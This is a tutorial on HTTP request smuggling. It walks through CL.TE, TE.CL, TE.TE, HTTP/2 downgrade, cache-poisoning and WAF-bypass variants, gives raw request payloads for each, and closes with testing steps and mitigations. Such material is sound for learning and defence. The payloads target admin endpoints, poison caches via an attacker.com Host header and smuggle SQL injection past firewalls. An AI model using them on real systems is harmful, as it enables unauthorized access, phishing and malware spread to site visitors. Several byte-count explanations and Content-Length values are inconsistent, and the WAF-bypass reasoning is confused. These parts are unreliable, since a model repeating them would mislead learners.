# HTTP Request Smuggling

HTTP Request Smuggling (CWE-444) occurs when different components in a web infrastructure interpret the same HTTP request differently. By exploiting inconsistencies in how proxies, load balancers, and backend servers parse HTTP headers, attackers can "smuggle" a hidden malicious request inside a legitimate one.

The vulnerability typically stems from inconsistencies in how systems handle **Content-Length (CL)** and **Transfer-Encoding (TE)** headers, leading to attack variants like **CL.TE**, **TE.CL**, and **TE.TE**.

***

### How It Works

The vulnerability exploits how front-end and back-end servers interpret request boundaries:

**Front-end server** (proxy, load balancer): Uses `Content-Length` to determine request size **Back-end server** (application server): Uses `Transfer-Encoding` to determine request size

When they disagree on where one request ends and another begins, the attacker can inject a second request that the front-end doesn't see but the backend processes.

***

### Real-World Attack Scenarios

#### Scenario 1: CL.TE Attack (Content-Length vs Transfer-Encoding)

Front-end uses `Content-Length`, back-end uses `Transfer-Encoding`:

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**How it works:**

1. **Front-end reads** Content-Length: 13 bytes
   * Sees "0\r\n\r\nSMUGGL" (13 bytes)
   * Forwards entire request to back-end
   * Reuses connection
2. **Back-end reads** Transfer-Encoding: chunked
   * Sees "0" chunk size (end of chunked data)
   * Stops reading request body
   * Leaves "ED" (from SMUGGLED) in the connection buffer
   * Next request reads "ED..." as part of its data

**The attack:**

Smuggle a second request disguised as body data:

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 49
Transfer-Encoding: chunked

0

POST /admin HTTP/1.1
Host: example.com
Content-Length: 0

```

**Result:**

* First request processed normally
* Second request smuggled, processed as separate request
* Access admin endpoint without authorization
* Poison response cache with admin data

**Finding it:** Use tools like Burp Repeater to test CL.TE variants. Observe how front-end and back-end respond to conflicting headers.

**Exploit:**

```bash
# Test with Burp Suite
# Create request with conflicting CL and TE headers
# Observe if smuggling succeeds by checking response timing/content
```

***

#### Scenario 2: TE.CL Attack (Transfer-Encoding vs Content-Length)

Front-end uses `Transfer-Encoding`, back-end uses `Content-Length`:

```http
POST / HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 3

8
SMUGGLED
0
```

**How it works:**

1. **Front-end reads** Transfer-Encoding: chunked
   * Sees "8" chunk (8 bytes: "SMUGGLED")
   * Sees "0" (end of chunks)
   * Forwards entire request
2. **Back-end reads** Content-Length: 3
   * Reads only 3 bytes: "8\r\n"
   * Stops reading
   * Leaves "SMUGGLED\r\n0" in buffer
   * Next request reads this as its body

**The attack:**

Smuggle a POST request with a crafted body that becomes the next request:

```http
POST / HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 4

5c
POST /admin HTTP/1.1
Host: example.com
Content-Length: 0

0
```

The "5c" is hex for 92 (length of smuggled content).

**Result:**

* Access admin endpoint
* Bypass authentication checks
* Exploit internal functionality

***

#### Scenario 3: TE.TE Attack (Both Use Transfer-Encoding, But Parsing Differs)

Both front-end and back-end claim to support Transfer-Encoding, but parse it differently:

```http
POST / HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Transfer-Encoding: cow

8
SMUGGLED
0
```

Some servers:

* Ignore unknown TE values
* Treat request as chunked
* Process as normal
* But disagree on what constitutes end of request

**The attack:**

```http
POST / HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Transfer-Encoding: cow

8
SMUGGLED
0

GET /admin HTTP/1.1
Host: example.com

```

One server processes this normally, another reads the "SMUGGLED" part as next request body.

***

#### Scenario 4: H2.TE Attack (HTTP/2 to HTTP/1 Downgrade)

If the frontend uses HTTP/2, the following request will, once it's downgraded to HTTP/1, be misinterpreted by the server, causing it to calculate the request length incorrectly and smuggle the included payload: When HTTP/2 request is downgraded to HTTP/1, the HTTP/1 will use Content-Length: 0 and omit the remaining data. The remaining data will then instead be concatenated (smuggled) to the next HTTP request.

**The attack:**

```
H2 Request:
:method: POST
:path: /
:scheme: https
:authority: example.com
content-length: 0

x

H1 Interpretation (after downgrade):
POST / HTTP/1.1
Host: example.com
Content-Length: 0

x[REST OF NEXT REQUEST]
```

The "x" gets smuggled into the next request.

***

#### Scenario 5: Cache Poisoning via Request Smuggling

Attacker smuggles a request that poisons the cached response:

```http
POST /login HTTP/1.1
Host: example.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Host: attacker.com
Content-Length: 0
X-Forwarded-For: attacker.com
```

**The attack:**

1. Front-end processes first request normally
2. Back-end processes smuggled second request
3. Response to malicious request cached
4. All users receive attacker's malicious response
5. Users redirected to attacker site
6. Credentials stolen via phishing
7. Malware distributed

**Result:**

* Mass infection of website visitors
* Credential theft at scale
* Complete site compromise

***

#### Scenario 6: WAF Bypass via Request Smuggling

Web Application Firewall blocks requests containing:

* "union select" (SQL injection)
* "\<script>" (XSS)
* "../" (path traversal)

Attacker smuggles malicious request:

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 50
Transfer-Encoding: chunked

0

GET /search?q=union%20select HTTP/1.1
Host: example.com
```

**How it works:**

1. **WAF reads** Content-Length: 50 bytes
   * Analyzes first 50 bytes
   * Doesn't see "union select"
   * Allows request
2. **Backend reads** Transfer-Encoding: chunked
   * Processes smuggled request with "union select"
   * Executes SQL injection
   * WAF bypass successful

**Result:**

* Bypass security controls
* Execute attacks on backend
* Complete WAF evasion

***

### How to Identify HTTP Request Smuggling During Testing

**1. Test for CL.TE vulnerability**

Send request with both headers conflicting:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
```

Check if timing changes or smuggling succeeds.

**2. Test for TE.CL vulnerability**

Reverse the headers:

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 3

8
smuggled
0
```

Observe backend response.

**3. Use Burp Suite tools**

* Repeater with timing tests
* Collaborator for out-of-band confirmation
* Turbo Intruder for advanced exploitation

**4. Monitor response timing**

* Normal request: fast response
* Smuggling attempt: delayed response (waiting for next request)
* Successful smuggle: unusual response content

**5. Test with different protocols**

* HTTP/1.1
* HTTP/2 with downgrade

**6. Test backend connection reuse**

Try multiple requests to same connection:

```
Request 1 (normal)
Request 2 (smuggling attempt)
Request 3 (observe if affected by smuggled content)
```

***

### Mitigation Strategies

**Use HTTP/2 exclusively**

Resolve all variants of this vulnerability by configuring the front-end server to exclusively use HTTP/2 when communicating with back-end systems.

HTTP/2 uses frames with explicit length, eliminating parsing ambiguity.

**Normalize ambiguous requests**

Specific instances of this vulnerability can be resolved by reconfiguring the front-end server to normalize ambiguous requests before routing them onward.

**Reject ambiguous requests**

```
If both Content-Length and Transfer-Encoding present:
  Reject the request
  Close the connection
  Return 400 Bad Request
```

**Use same server software**

Ensure all servers in the chain run the same web server software with the same configuration.

**Disable connection reuse**

Disabling back-end connection reuse is likely to reduce the impact of this vulnerability.

Close connections after each request instead of reusing.

**Strict header validation**

* Reject multiple Content-Length headers
* Reject conflicting CL/TE headers
* Validate header format strictly
* Log suspicious requests

**WAF rules**

* Detect CL/TE conflicts
* Block requests with both headers
* Monitor for suspicious patterns

***

&#123;% embed url="<https://cwe.mitre.org/data/definitions/444.html>" %}

&#123;% embed url="<https://portswigger.net/kb/issues/00200140_http-request-smuggling>" %}

&#123;% embed url="<https://www.yeswehack.com/learn-bug-bounty/http-request-smuggling-guide-vulnerabilities>" %}

&#123;% embed url="<https://portswigger.net/research/http-request-smuggling>" %}
